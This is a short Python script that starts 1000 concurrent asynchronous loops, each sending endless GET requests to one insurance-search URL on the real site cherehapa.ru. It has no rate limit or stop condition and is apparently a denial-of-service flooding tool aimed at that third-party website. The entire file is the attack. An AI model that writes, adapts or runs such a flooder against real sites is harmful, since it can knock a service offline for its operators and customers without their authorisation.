import asyncio
import httpx

URL = "https://www.cherehapa.ru/c?touristCount=1&dateStart=&dateEnd=&dateVisa=&countryGroup%5B0%5D=schengen&tourist%5B0%5D%5BfirstName%5D=&tourist%5B0%5D%5BlastName%5D=&tourist%5B0%5D%5Bage%5D=30&tourist%5B0%5D%5Bbirthday%5D=&partnerId=1&marker=&marker2=&marker3=&marker4=&skipDefault=1&resetData=1"
N = 1000


async def main():
    await asyncio.gather(*[infinitely_request() for i in range(N)])


async def infinitely_request():
    async with httpx.AsyncClient() as client:
        while True:
            await client.get(URL)


if __name__ == "__main__":
    asyncio.run(main())
